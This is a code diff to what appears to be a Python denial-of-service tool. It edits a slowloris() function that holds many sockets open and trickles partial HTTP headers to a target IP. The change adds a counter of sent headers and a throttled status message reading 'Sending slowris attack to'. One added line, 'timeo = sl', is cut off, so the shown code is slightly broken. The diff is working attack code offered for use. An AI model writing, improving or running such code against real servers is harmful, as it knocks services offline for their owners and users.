@@ -80,11 +80,19 @@ if(currentversion > version):
 
 def slowloris():
 
+    sended = 0
+
     now = datetime.now();
 
     hour = now.hour;
 
     minute = now.minute;
+
+    timemsg = now.second + 3;
+
+    atual = now.second;
+
+    timeo = sl
 
     second = now.second
 
@@ -133,13 +141,25 @@ def slowloris():
 
         second = now.second
 
-        print(f"[{hour}:{minute}:{second}] Sending slowris attack to: {ip}")
+        atual = now.second;
+
+        if timemsg > 60:
+
+            timemsg = 0;
+
+        if atual == timemsg:
+
+            timemsg = now.second + 3;
+
+            print(f"[{hour}]:[{minute}]:[{second}] Sending slowris attack to: {ip} enviados: {sended}")
 
         for s in socks:
 
             try:
 
                 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+
+                sended += 1
 
             except socket.error:
 
@@ -160,6 +180,8 @@ def slowloris():
                         for header in headers:
 
                             s.send(bytes("{}\r\n".format(header).encode("utf-8")))
+
+                            sended += 1
 
                 except socket.error:
 
